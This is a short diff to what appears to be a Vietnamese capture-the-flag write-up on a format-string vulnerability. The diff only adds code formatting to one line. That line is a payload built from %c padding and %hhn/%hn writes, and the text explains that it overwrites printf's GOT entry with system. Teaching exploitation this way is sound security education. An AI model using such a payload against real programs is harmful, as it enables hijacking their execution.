@@ -89,7 +89,7 @@ Vì chúng ta đã tạo được một vòng lặp vô hạn, chúng ta có th�
 
 Mình dùng 2 lần lặp để tạo ra 2 địa chỉ tay printf got và printf got + 2, sau đó dùng 2 địa chỉ này để ghi đè printf -> system sử dụng payload sau.
 
-'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%' + str(target1 - 14) + 'c%hhn%c%c%c%c%' + str(target2 - target1 - 4) + 'c%hn'
+`'%c%c%c%c%c%c%c%c%c%c%c%c%c%c%' + str(target1 - 14) + 'c%hhn%c%c%c%c%' + str(target2 - target1 - 4) + 'c%hn'`
 
 Với target1 là byte thứ 3 và target 2 là 2 byte cuối.
 
